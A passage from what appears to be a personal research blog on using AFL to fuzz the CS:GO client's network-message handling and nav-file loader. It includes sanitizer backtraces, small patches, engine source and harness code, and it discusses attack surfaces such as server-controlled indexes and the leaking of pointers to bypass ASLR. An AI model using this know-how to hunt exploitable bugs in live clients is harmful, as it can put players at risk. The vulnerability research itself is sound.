    #6 0x7fb353a05689 in CNetChan::ProcessPacket(netpacket_s*, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:3195
    #7 0x7fb353a41011 in replaypacket(CNetChan*, int) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2431
    #8 0x7fb353a4cd7f in NET_ProcessSocket(int, IConnectionlessPacketHandler*) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2578
    #9 0x7fb352ebd4aa in CL_ReadPackets(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/cl_main.cpp:512
    #10 0x7fb353973394 in _Host_RunFrame_Client(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3368
    #11 0x7fb353979257 in _Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4283
    #12 0x7fb35398406c in Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4693
    #13 0x7fb3539a9840 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
    #14 0x7fb3539aaaf3 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:808
    #15 0x7fb353be97a9 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #16 0x7fb353bd996f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #17 0x7fb353bd9ec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #18 0x7fb353bd9ec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #19 0x7fb35436f7df in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #20 0x7fb353bdfc22 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #21 0x7fb35850401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #22 0x7fb35850401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #23 0x7fb3584ec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #24 0x7fb35bbb4082 in __libc_start_main ../csu/libc-start.c:308
    #25 0x5584bed5527d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /usr/include/c++/9/bits/basic_string.h:5199 in std::string::c_str() const
==176568==ABORTING

```
{% endraw %}

here is the fix:

{% raw %}
```

    for( int i = 0; i < 4; i++ )
    {
        // Allow localizing player names

        if (msg.params(i) == NULL) {
            return true;
        }

        if ( const char *pszEntIndex = StringAfterPrefix( msg.params(i).c_str(), "#ENTNAME[" ) )
        {
            int iEntIndex = V_atoi( pszEntIndex );
            wchar_t wszPlayerName[MAX_DECORATED_PLAYER_NAME_LENGTH] = {};

```
{% endraw %}

That msg.params(i) == NULL check checks if the message is null.

Then there is another null pointer dereference:

{% raw %}
```

==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x7f22b1d968a0 bp 0x7ffc1bda9a00 sp 0x7ffc1bda9160 T0)
==232782==The signal is caused by a READ memory access.
==232782==Hint: address points to the zero page.
    #0 0x7f22b1d9689f in __interceptor_strcmp ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:426
    #1 0x7f22979d6c2b in RkHudRadar::MsgFunc_ProcessSpottedEntityUpdate(CCSUsrMsg_ProcessSpottedEntityUpdate const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/client/cstrike15/RocketUI/rkhud_radar.cpp:75
    #2 0x7f22965b49ef in CUserMessages::DispatchUserMessage(int, int, int, void const*) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/usermessages.cpp:97
    #3 0x7f22a9744546 in CClientState::SVCMsg_UserMessage(CSVCMsg_UserMessage const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/servermsghandler.cpp:727
    #4 0x7f22a93db708 in CNetChan::_ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2568
    #5 0x7f22a93dce02 in CNetChan::ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2413
    #6 0x7f22a93ea689 in CNetChan::ProcessPacket(netpacket_s*, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:3195
    #7 0x7f22a9426011 in replaypacket(CNetChan*, int) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2431
    #8 0x7f22a9431d7f in NET_ProcessSocket(int, IConnectionlessPacketHandler*) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2578
    #9 0x7f22a88a24aa in CL_ReadPackets(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/cl_main.cpp:512
    #10 0x7f22a9358394 in _Host_RunFrame_Client(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3368
    #11 0x7f22a935e257 in _Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4283
    #12 0x7f22a936906c in Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4693
    #13 0x7f22a938e840 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
    #14 0x7f22a938faf3 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:808
    #15 0x7f22a95ce7a9 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #16 0x7f22a95be96f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #17 0x7f22a95beec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #18 0x7f22a95beec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #19 0x7f22a9d547df in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #20 0x7f22a95c4c22 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #21 0x7f22adf0401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #22 0x7f22adf0401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #23 0x7f22adeec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #24 0x7f22b1599082 in __libc_start_main ../csu/libc-start.c:308
    #25 0x55a6005e527d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:426 in __interceptor_strcmp
==232782==ABORTING

```
{% endraw %}


After patching all of these bugs out which do not benefit us, we are now ready to fuzz again. I think that there is a possible bug in tesla coil code, but more on that some other time.

Note to self: the source sdk is in ~/Netpacketfuzzer/sourcesdk/ 

---------------

After doing these patches the fuzzer found 24 unique crashes. When running our triage script we get the info about these crashes. Here is one backtrace:

{% raw %}
```

Parse done
Printing done
Poopooshitoooofff
Poopoo thing
*netmsg->GetName() == CSVCMsg_CmdKeyValues
terminate called after throwing an instance of 'std::bad_array_new_length'
  what():  std::bad_array_new_length

Thread 1 "csgo_linux64" received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
50	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) where
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff6e3c859 in __GI_abort () at abort.c:79
#2  0x00007ffff7216911 in ?? () from /lib/x86_64-linux-gnu/libstdc++.so.6
#3  0x00007ffff722238c in ?? () from /lib/x86_64-linux-gnu/libstdc++.so.6
#4  0x00007ffff72223f7 in std::terminate() () from /lib/x86_64-linux-gnu/libstdc++.so.6
#5  0x00007ffff72226a9 in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6
#6  0x00007ffff72163e6 in __cxa_throw_bad_array_new_length () from /lib/x86_64-linux-gnu/libstdc++.so.6
#7  0x00007fffeddffb0e in KeyValues::ReadAsBinary (this=<optimized out>, buffer=..., nStackDepth=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/tier1/keyvalues.cpp:91
#8  0x00007fffeed51834 in CmdKeyValuesHelper::SVCMsg_GetKeyValues (msg=...) at /home/cyberhacker/Codecoveragething/Kisak-Strike/common/netmessages.cpp:154
#9  0x00007fffee0544d6 in CBaseClientState::SVCMsg_CmdKeyValues (this=<optimized out>, msg=...) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/baseclientstate.cpp:3406
#10 0x00007fffeec80709 in CNetChan::_ProcessMessages (this=this@entry=0x6290006f4200, buf=..., wasReliable=wasReliable@entry=false) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2568
#11 0x00007fffeec81e03 in CNetChan::ProcessMessages (this=0x6290006f4200, buf=..., wasReliable=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2413
#12 0x00007fffeec8f68a in CNetChan::ProcessPacket (this=0x6290006f4200, packet=0x616000023d80, bHasHeader=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:3195
#13 0x00007fffeeccb012 in replaypacket (netchan=0x6290006f4200, socket=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2431
#14 0x00007fffeecd6d80 in NET_ProcessSocket (sock=sock@entry=0, handler=handler@entry=0x7fffe43d3810) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2578
#15 0x00007fffee1474ab in CL_ReadPackets (bFinalTick=bFinalTick@entry=true) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/cl_main.cpp:512
#16 0x00007fffeebfd395 in _Host_RunFrame_Client (framefinished=framefinished@entry=true) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3368
#17 0x00007fffeec03258 in _Host_RunFrame (time=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4283
#18 0x00007fffeec0e06d in Host_RunFrame (time=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4693
#19 0x00007fffeec33841 in CHostState::State_Run (this=this@entry=0x7ffff05271e0 <g_HostState>, frameTime=<optimized out>, frameTime@entry=0.199330002) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
#20 0x00007fffeec34af4 in CHostState::FrameUpdate (this=this@entry=0x7ffff05271e0 <g_HostState>, time=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:808
#21 0x00007fffeec35510 in HostState_Frame (time=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:129
#22 0x00007fffeee737aa in CEngine::Frame (this=0x7ffff053a5c0 <g_Engine>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
#23 0x00007fffeee63970 in CEngineAPI::MainLoop (this=this@entry=0x7ffff0539fe0 <s_EngineAPI>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
#24 0x00007fffeee63ec5 in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
#25 CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
#26 0x00007fffef5f97e0 in CAppSystemGroup::Run (this=this@entry=0x7fffffffd550) at /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#27 0x00007fffeee69c23 in CEngineAPI::RunListenServer (this=0x7ffff0539fe0 <s_EngineAPI>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
#28 0x00007ffff3704020 in CAppSystemGroup::Run (this=0x7fffffffd880) at /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#29 0x00007ffff3704020 in CAppSystemGroup::Run (this=0x7fffffffd780) at /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#30 0x00007ffff36ec996 in LauncherMain (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
#31 0x00007ffff6e3e083 in __libc_start_main (main=0x555555555180 <main(int, char**)>, argc=10, argv=0x7fffffffdbd8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdbc8) at ../csu/libc-start.c:308
#32 0x000055555555527e in _start ()



```
{% endraw %}

This backtrace does not really make any sense, since the stuff at the line 91 is in the Pop function which does not seem to get called anywhere. The error happens on an Assert statement, but I think that this is because I compiled the program with the Debug flag set which treats asserts as aborts. Maybe try compiling with build type Release instead?

I dunno. That may be a bug in gdb or some optimization shit, but adding a lot of ConMsg messages I narrow the problem to this:


{% raw %}
```
			{
				int nLength = buffer.GetShort();

				dat->m_wsValue = new wchar_t[nLength + 1];

				for( int k = 0; k < nLength; ++ k )
				{
					dat->m_wsValue[k] = buffer.GetShort();
				}
				dat->m_wsValue[ nLength ] = 0;
				break;
			}

```
{% endraw %}


Here if nLength is negative then the new wchar_t stuff will throw that error.

here is the fix:

{% raw %}
```

				ConMsg("After nLength. nLength == %d\n", nLength);
				if (nLength <= 0) {
					return false;
				}
				dat->m_wsValue = new wchar_t[nLength + 1];
				ConMsg("After m_wsValue\n");

```
{% endraw %}

I don't think there is an exploitable bug there since we just allocate the stuff and then there is no way to even read past it because the loop uses nLength too so I don't think that this is interesting in any way. This just causes a crash which is not exploitable. After adding that check this input no longer crashes.


------------------------------------------

It has now been a long while since I last updated this blog, but now I am here again. Now in the meantime I have mainly just looked around the code for any places other than the packet handler which we could fuzz. One idea is to just go back to fuzzing the BSP files, because last time I used a stripped down version of the BSP file which does not cover that much of the code, but instead sacrifices coverage for more executions.

I also made some changes to the csgo source itself. I patched out a couple of netmessages which no longer exist in the newest version of the game, so we do not waste time fuzzing messages which no longer exist. I have also read up on some writeups other people have made. For example this: https://neodyme.io/blog/csgo_from_zero_to_0day/#full-logic-bug-chain which uses pure logic bugs to exploit a target and does not even use any common binary exploitation techniques often used when exploiting a target.

I also made a small change to my fuzzer. Originally it generates only completely random integers, but I added a function called set_small_int which updates the element of the protobuf to a small integer, usually more than -64 but less than 64. I did this because some fields require small integers to work. For example the temp entities net message acts upon entities in the game, which are accessed by a bounds checked index. This index is usually a small positive integer. Therefore if we had a completely random integer instead, then it would barely hit the interesting code which we want. I also managed to get a coverage report of the current corpus and it is quite good in my opinion. It hits the vast majority of the packet handling code. I also compiled the fuzzing version with USE_ROCKETUI=OFF to actually use the ui which the main game uses. (I think.)

One attack vector which seems poorly explored is this: https://hackerone.com/reports/542180 . Navigation mesh files. I think that I am going to try fuzzing those next if fuzzing the packet parser does not yield any results.

Also another change I did was that I banned the use of stringtable net messages for now. This is because the string table messages are quite large and take up a long time to parse and execute.

Another thing is that the net messages are also dependent on each other. This is bad, because my fuzzer just throws random messages at the program expecting it to maybe crash. This is a good strategy to find "shallow" bugs, but more complex bugs which require complex interactions with the target are very hard to find. Maybe I should implement a "stateful" fuzzer some time. Another thing is that I should some time focus on fuzzing one type of message at a time and go through all of the netmessages in order. I think that this should yield better results. One interesting message which sparked my interest was SVCMsg_BSPDecal . I do not really care about what it is supposed to accomplish, but looking at the code implementation:

{% raw %}
```
bool CClientState::SVCMsg_BSPDecal( const CSVCMsg_BSPDecal& msg )
{
	model_t	* model;

	if ( msg.entity_index() )
	{
		model = GetModel( msg.model_index() );
	}
	else
	{
		model = host_state.worldmodel;
		if ( !model )
		{
			Warning( "ProcessBSPDecal:  Trying to project on world before host_state.worldmodel is set!!!\n" );
		}
	}

	if ( model == NULL )
	{
		IMaterial *mat = Draw_DecalMaterial( msg.decal_texture_index() );
		char const *matname = "???";
		if ( mat )
		{
			matname = mat->GetName();
		}

		Warning( "Warning! Static BSP decal (%s), on NULL model index %i for entity index %i.\n", 
			matname,
			msg.model_index(), 
			msg.entity_index() );
		return true;
	}

	if (r_decals.GetInt())
	{
		const CMsgVector& pos = msg.pos();
		const Vector vecPos( pos.x(), pos.y(), pos.z() );

		g_pEfx->DecalShoot(
			msg.decal_texture_index(),
			msg.entity_index(),
			model,
			vec3_origin,
			vec3_angle,
			vecPos,
			NULL,
			msg.low_priority() ? 0 : FDECAL_PERMANENT );
	}

	return true;
}

```
{% endraw %}
We look that there is a lot of stuff with indexes. For example mat is a return value of a function which gets passed a server controlled integer with msg.decal_texture_index() .


{% raw %}
```
IMaterial *Draw_DecalMaterial( int index )
{
	if ( BIsPlayerLogoDecal( index ) )
		return materials->FindMaterial( "decals/playerlogo01", TEXTURE_GROUP_DECAL, true );

	if ( index < 0 || index >= g_DecalLookup.Count() )
		return NULL;

	int slot = g_DecalLookup[index];
	if ( slot < 0 || slot >= (int)g_DecalDictionary.MaxElement() )
		return NULL;

	DecalEntry * entry = &g_DecalDictionary[slot];
	
	if ( entry )
	{
		return entry->material;
	}
	else
	{
		return NULL;
	}
}

```
{% endraw %}

We can see that it returns a pointer from a list which gets accessed by an index we control. Then in the parent function a method gets then called on this address. This is very similar to the entitymessage bug, but now instead the indexes are bounds checked. Even though the indexes are bounds checked here does not mean that they are checked everywhere. It only takes one slip up to ruin it all.

Another attack vector is that the csgo client has enabled the download of external resources from any arbitrary server which of course can be attacker controlled. This was abused to exploit the client in a couple writeups which I saw. There was one upper case vs lower case issue with the Content-Length header which lead to the leakage of function pointers which can be used to bypass aslr.

Yeah fuck that. I am going to try the fuzzing shit with the CSVCMsg_BSPDecal messags only and see if it finds anything. My guess is that it won't find anything, but atleast it is some good practice for me.

------------------

After fuzzing the bsp decals only it found zero crashes :( . Anyway. Now maybe I should systematically go through each of the net messages in a similar fashion, but in the meantime I will adapt the code to fuzz the nav files which seem to be quite an unexplored territory. I also found the weapon_parse.cpp file which seems interesting.

Looking at the navigation mesh code, there is this code in the gameinterface.cpp file:


{% raw %}
```

...


	CEG_PROTECT_VIRTUAL_FUNCTION( CServerGameDLL_ServerActivate );

	IGameSystem::LevelInitPostEntityAllSystems();
	// No more precaching after PostEntityAllSystems!!!
	CBaseEntity::SetAllowPrecache( false );

	// only display the think limit when the game is run with "developer" mode set
	if ( !g_pDeveloper->GetInt() )
	{
		think_limit.SetValue( 0 );
	}

#ifndef _XBOX

    // THIS IS THE INTERESTING PART!!
	// load the Navigation Mesh for this map
	TheNavMesh->Load();
	TheNavMesh->OnServerActivate();
#endif

#if defined( CSTRIKE_DLL ) // BOTPORT: TODO: move these ifdefs out
	TheBots->ServerActivate();
#endif
}

...

```
{% endraw %}

The Load function will be the function which we will be fuzzing. Looking at the OnServerActivate function it seems to only connect the elevator objects in the navigation mesh.

{% raw %}
```

//--------------------------------------------------------------------------------------------------------------
/**
 * Invoked when server loads a new map
 */
void CNavMesh::OnServerActivate( void )
{
	FOR_EACH_VEC( TheNavAreas, pit )
	{
		CNavArea *area = TheNavAreas[ pit ];
		area->OnServerActivate();
	}
}


...


void CNavArea::OnServerActivate( void )
{
	ConnectElevators();
	m_damagingTickCount = 0;
}


...

//--------------------------------------------------------------------------------------------------------------
/**
 * Find elevator connections between areas
 */
void CNavArea::ConnectElevators( void )
{
	m_attributeFlags &= ~NAV_MESH_HAS_ELEVATOR;

#ifdef TERROR
	// connect elevators
	CFuncElevator *elevator = NULL;
	while( ( elevator = (CFuncElevator *)gEntList.FindEntityByClassname( elevator, "func_elevator" ) ) != NULL )
	{
		if ( elevator->GetNumFloors() < 2 )
		{
			// broken elevator
			continue;
		}

		Extent elevatorExtent;
		elevator->CollisionProp()->WorldSpaceSurroundingBounds( &elevatorExtent.lo, &elevatorExtent.hi );

		if ( IsOverlapping( elevatorExtent ) )
		{
			// overlaps in 2D - check that this area is within the shaft of the elevator
			const Vector &center = GetCenter();

			for( int f=0; f<elevator->GetNumFloors(); ++f ) 
			{
				const FloorInfo	*floor = elevator->GetFloor( f );
				const float tolerance = 30.0f;

				if ( center.z <= floor->height + tolerance && center.z >= floor->height - tolerance )
				{
					if ( m_elevator )
					{
						Warning( "Multiple elevators overlap navigation area #%d\n", GetID() );
						break;
					}

					// this area is part of an elevator system
					m_elevator = elevator;
					m_attributeFlags |= NAV_MESH_HAS_ELEVATOR;

					// find the largest area overlapping this elevator on each other floor 
					for( int of=0; of<elevator->GetNumFloors(); ++of ) 
					{
						if ( of == f )
						{
							// we are on this floor
							continue;
						}

						const FloorInfo	*otherFloor = elevator->GetFloor( of );

						// find the largest area at this floor
						CNavArea *floorArea = NULL;
						float floorAreaSize = 0.0f;

						FOR_EACH_VEC( TheNavAreas, it )
						{
							CNavArea *area = TheNavAreas[ it ];

							if ( area->IsOverlapping( elevatorExtent ) )
							{
								if ( area->GetCenter().z <= otherFloor->height + tolerance && area->GetCenter().z >= otherFloor->height - tolerance )
								{
									float size = area->GetSizeX() * area->GetSizeY();
									if ( size > floorAreaSize )
									{
										floorArea = area;
										floorAreaSize = size;
									}
								}
							}
						}

						if ( floorArea )
						{
							// add this area to the set of areas reachable via elevator
							NavConnect con;
							con.area = floorArea;
							con.length = ( floorArea->GetCenter() - GetCenter() ).Length();
							m_elevatorAreas.AddToTail( con );
						}
						else
						{
							Warning( "Floor %d ('%s') of elevator at ( %3.2f, %3.2f, %3.2f ) has no matching navigation areas\n", 
									 of, 
									 otherFloor->name.ToCStr(),
									 elevator->GetAbsOrigin().x, elevator->GetAbsOrigin().y, elevator->GetAbsOrigin().z );
						}
					}

					// we found our floor
					break;
				}
			}
		}
	}
#endif // TERROR
}


```
{% endraw %}

So I do not think that there is that much point in fuzzing this part of the code.

Looking at the backtrace of the CNavArea::Load function we see that the Load function is called from ServerActivate function and so on. I think that I will apply the same strategy as previously except because of the dumbass way the file is loaded, we first need to write the buffer into the file and then load the file, but lets see.

Also looking at the start of the nav_file.cpp file we see that it was originally made in 2003 :) :

{% raw %}
```

//========= Copyright � 1996-2005, Valve Corporation, All rights reserved. ============//
//
// Purpose: 
//
// $NoKeywords: $
//
//=============================================================================//
// nav_file.cpp
// Reading and writing nav files
// Author: Michael S. Booth (mike@turtlerockstudios.com), January-September 2003

```
{% endraw %}



This is my first attempt at the fuzzer:

{% raw %}
```

__AFL_FUZZ_INIT();


NavErrorType CNavMesh::Fuzzer( void ) {
	
	// deferred forkserver so we need to do this.

	__AFL_INIT();


	//netpacket_t * packet;
	
	//net_scratchbuffer_t scratch;
	//unsigned char packet_buffer[scratch.Size()];
	NavErrorType result;
	FILE* fp;
	int length;
	int InSequenceNumber = 0;
	int OutSequenceNumberAck = 0;
	int OutSequenceNumber = 0; // not used
	int flags = 0;
	int counter = 0;
	unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
	Warning("Called Fuzzer\n");
	printf("Called Fuzzer\n");

	//fprintf(stderr, "Called NET_ProcessSocket!\n");


	char* filename;
	
	filename = GetFilename(); // Get current filename

	// Debug message.

	ConMsg("Filename of the navigation mesh is this: %s\n", filename);

	while (__AFL_LOOP(10000000)) {

		// Main fuzz loop

		int len = __AFL_FUZZ_TESTCASE_LEN;

		// First write the testcase on disk. This is dumb for obvious reasons, but we need to do this. (Maybe we can use some sort of ramdisk.)

		fp = fopen(filename, "wb"); // Open in write binary mode.

		// I think that opening a file automatically erases everything what was inside of it originally.

		// fwrite(addressData, sizeData, numbersData, pointerToFile);    // thanks to https://www.programiz.com/c-programming/c-file-input-output

		fwrite(buf, 1, len, fp);

		fclose(fp); // Close fd .


		// Now try parsing said file with the Load function.

		result = OriginalLoad()


	}


	return result; // This does not really matter, but idk
}


```
{% endraw %}


This function is called from the very start of the CNavMesh::Load function. The OriginalLoad function is the unmodified code of the CNavMesh::Load function, because obviously we can not just jump to the modified version and cause a recursion loop.

Now It is time to recompile (of course). Except before doing that I think that I should copy all of the shit from the other version here.

after a couple of compiling errors I ended up with this:

{% raw %}
```

__AFL_FUZZ_INIT();


NavErrorType CNavMesh::Fuzzer( void ) {
	
	// deferred forkserver so we need to do this.

	__AFL_INIT();


	//netpacket_t * packet;
	
	//net_scratchbuffer_t scratch;
	//unsigned char packet_buffer[scratch.Size()];
	NavErrorType result;
	FILE* fp;
	int length;
	int InSequenceNumber = 0;
	int OutSequenceNumberAck = 0;
	int OutSequenceNumber = 0; // not used
	int flags = 0;
	int counter = 0;
	unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
	Warning("Called Fuzzer\n");
	printf("Called Fuzzer\n");

	//fprintf(stderr, "Called NET_ProcessSocket!\n");


	const char* filename;
	
	filename = GetFilename(); // Get current filename

	// Debug message.

	ConMsg("Filename of the navigation mesh is this: %s\n", filename);

	while (__AFL_LOOP(10000000)) {

		// Main fuzz loop

		int len = __AFL_FUZZ_TESTCASE_LEN;

		// First write the testcase on disk. This is dumb for obvious reasons, but we need to do this. (Maybe we can use some sort of ramdisk.)

		fp = fopen(filename, "wb"); // Open in write binary mode.

		// I think that opening a file automatically erases everything what was inside of it originally.

		// fwrite(addressData, sizeData, numbersData, pointerToFile);    // thanks to https://www.programiz.com/c-programming/c-file-input-output

		fwrite(buf, 1, len, fp);

		fclose(fp); // Close fd .


		// Now try parsing said file with the Load function.

		result = OriginalLoad();


	}


	return result; // This does not really matter, but idk
}

```
{% endraw %}

Now it is time to test this and see what happens. Also just a side not I think that I am going to try the closed source shit at some point where I jump to the main game code, but then patch the engine to jump to our code which parses the packet and calculates the checksum and shit and then jumps back to the game code. This is a lot harder than with the source code version, but my rationale is that we can then find bugs in the new messages in addition to the old ones, such that we do not need to check every bug we find with the never version. Altough using the closed source new binary requires the use of the QEMU mode which sucks.

Now trying the fuzzer it does not seem to work initially. Looking at the execs per second it stands at exactly 1 seconds per second.

Time to add debugging messages to the code! Yeay (sarcasm).

I am checking the sha256sum of the file which it is supposed to load and it does not change. Therefore the mutation code is not working properly.

And then looking at the filename it becomes blindingly obvious why the fuzzer does not work. The GetFilename returns this: "/home/cyberhacker/Fuzzingnavfiles/game/csgo\maps\de_dust2.nav" . Because this is a linux host, we need to pass this string to COM_FixSlashes .


{% raw %}
```

inline void COM_FixSlashes( char *pname )
{
#ifdef _WIN32
	while ( *pname ) 
	{
		if ( *pname == '/' )
			*pname = '\\';
		pname++;
	}
#else
	while ( *pname ) 
	{
		if ( *pname == '\\' )
			*pname = '/';
		pname++;
	}
#endif
}



```
{% endraw %}

Next up is an asan error. See, the training1 map which I am using to fuzz the nav files has VScripts. VScripts are basically their own programming language which is programmed in the programming language called squirrel.

https://developer.valvesoftware.com/wiki/VScript .

The de_dust2 map does not have these, so therefore we do not get the same asan error when running with de_dust2.

{% raw %}
```
Thread 1 "csgo_linux64" received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
50	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) where
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff6d74859 in __GI_abort () at abort.c:79
#2  0x00007ffff76902e2 in __sanitizer::Abort () at ../../../../src/libsanitizer/sanitizer_common/sanitizer_posix_libcdep.cc:155
#3  0x00007ffff769ae8c in __sanitizer::Die () at ../../../../src/libsanitizer/sanitizer_common/sanitizer_termination.cc:57
#4  0x00007ffff767c52c in __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffff899e, __in_chrg=<optimized out>) at ../../../../src/libsanitizer/asan/asan_report.cc:185
#5  0x00007ffff767a7dd in __asan::ReportNewDeleteTypeMismatch (addr=addr@entry=105690571174064, delete_size=delete_size@entry=1, delete_alignment=delete_alignment@entry=0, free_stack=free_stack@entry=0x7fffffff9550) at ../../../../src/libsanitizer/asan/asan_report.cc:192
#6  0x00007ffff758dbf5 in __asan::Allocator::Deallocate (alloc_type=__asan::FROM_NEW, stack=0x7fffffff9550, delete_alignment=0, delete_size=1, ptr=0x602000f370b0, this=0x7ffff76efe00 <__asan::instance>) at ../../../../src/libsanitizer/asan/asan_allocator.cc:642
#7  __asan::asan_delete (ptr=0x602000f370b0, size=1, alignment=0, stack=0x7fffffff9550, alloc_type=__asan::FROM_NEW) at ../../../../src/libsanitizer/asan/asan_allocator.cc:870
#8  0x00007ffff7675c2d in operator delete (ptr=0x602000f370b0, size=size@entry=1) at ../../../../src/libsanitizer/asan/asan_new_delete.cc:177
